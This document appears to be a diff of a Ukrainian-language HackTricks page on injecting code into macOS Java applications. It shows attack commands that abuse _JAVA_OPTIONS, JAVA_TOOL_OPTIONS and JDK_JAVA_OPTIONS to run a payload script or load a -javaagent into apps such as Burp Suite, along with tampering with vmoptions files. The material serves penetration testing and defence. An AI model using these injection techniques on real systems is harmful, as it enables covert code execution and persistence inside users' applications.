@@ -1,10 +1,10 @@
-# Ін’єкція в Java Applications у macOS
+# macOS Java Applications Injection
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Перерахування
 
-Знайдіть Java applications, встановлені у вашій системі. Було помічено, що Java apps у **Info.plist** містять деякі java parameters, які містять рядок **`java.`**, тому можна виконати пошук за ним:
+Знайдіть Java applications, установлені у вашій системі. Було помічено, що Java apps у **Info.plist** містять деякі параметри Java, які містять рядок **`java.`**, тому його можна шукати:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -15,6 +15,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ## \_JAVA_OPTIONS
 
 Змінну середовища **`_JAVA_OPTIONS`** можна використовувати для ін’єкції довільних параметрів Java VM під час запуску Java-застосунку.<sup>[[1]](#references)</sup>
+
+Java launch stack також розпізнає дві чіткіше визначені змінні з різними областями дії:
+
+- `JAVA_TOOL_OPTIONS` зчитується під час створення VM, зокрема в деяких вбудованих шляхах запуску, які не проходять через launcher `java`. Вона може ін’єктувати параметри instrumentation, такі як `-javaagent`, `-agentlib` або `-agentpath`.<sup>[[4]](#references)</sup>
+- `JDK_JAVA_OPTIONS` додається launcher `java` на початок командного рядка. Параметри, які вибирають main class або завершують роботу launcher, заборонені, але `-javaagent` дозволений.<sup>[[5]](#references)</sup>
+
+Усі три змінні слід розглядати як засоби керування виконанням коду JVM, якщо attacker також може надати сумісний доступний для читання agent. `_JAVA_OPTIONS` є деталлю реалізації HotSpot, тому перевіряйте її відповідність конкретним vendor і version; `JAVA_TOOL_OPTIONS` або `JDK_JAVA_OPTIONS` є кращими для portable testing.
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
@@ -73,7 +80,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Однак ця техніка спричиняє помилку у виконуваній програмі. Більш прихованою альтернативою є створення Java agent і використання `-javaagent`:<sup>[[2]](#references)</sup>
+Однак цей метод спричиняє помилку у виконуваному застосунку. Більш прихованою альтернативою є створення Java agent і використання `-javaagent`:<sup>[[2]](#references)</sup>
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -81,11 +88,17 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 # Or
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
+
+# The same agent with the standardized VM initialization variable:
+JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
+
+# Or through the JDK java launcher:
+JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
 ```
 > [!CAUTION]
-> Створення агента з **іншою версією Java**, ніж у застосунку, може призвести до аварійного завершення роботи як агента, так і застосунку.
+> Створення агента з **іншою версією Java**, ніж у застосунку, може призвести до аварійного завершення роботи агента й застосунку.
 
-Де агент може бути:
+Агент може бути:
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -125,12 +138,12 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 ```
 ## Файл vmoptions
 
-Цей файл підтримує вказання **параметрів Java** під час запуску Java. Ви можете використати деякі з попередніх технік, щоб змінити параметри Java і **змусити процес виконувати довільні команди**.\
-Крім того, цей файл також може **підключати інші файли** за допомогою директиви `include`, тому ви також можете змінити підключений файл.
+Цей файл підтримує зазначення **Java parameters** під час запуску Java. Ви можете використати деякі з попередніх технік, щоб змінити параметри Java і **змусити процес виконувати довільні команди**.\
+Крім того, цей файл також може **включати інші файли** за допомогою директиви `include`, тому ви також можете змінити включений файл.
 
-Більше того, деякі Java-застосунки **завантажують більше одного** файла `vmoptions`.
+Більше того, деякі Java apps **завантажують більше одного** файла `vmoptions`.
 
-Деякі застосунки, як-от Android Studio, вказують у своєму **виводі, де вони шукають** ці файли:<sup>[[3]](#references)</sup>
+Деякі застосунки, наприклад Android Studio, вказують у своїх **вивідних даних, де вони шукають** ці файли:<sup>[[3]](#references)</sup>
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +154,7 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-Якщо вони цього не роблять, перевірити це можна за допомогою:
+Якщо вони цього не роблять, ви можете перевірити це за допомогою:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -156,4 +169,6 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 - [1] [OpenJDK — аналіз `_JAVA_OPTIONS` у `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
 - [2] [Oracle Java — специфікація пакета `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
 - [3] [JetBrains — налаштування параметрів JVM і властивостей платформи](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
+- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
+- [5] [Запускач `java` — змінна середовища запуску `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
 {{#include ../../../banners/hacktricks-training.md}}
